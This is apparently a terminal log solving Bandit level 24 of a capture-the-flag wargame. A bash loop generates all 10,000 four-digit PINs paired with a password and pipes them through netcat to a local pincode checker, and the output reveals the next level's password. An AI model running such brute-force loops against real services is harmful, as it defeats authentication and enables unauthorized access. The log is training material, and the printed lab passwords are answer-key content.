bandit24@bandit:~$ for i in $(seq -f "%04g" 0 9999); do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/pins; done;

bandit24@bandit:~$ cat /tmp/pins | nc localhost 30002 | grep password
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
# The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG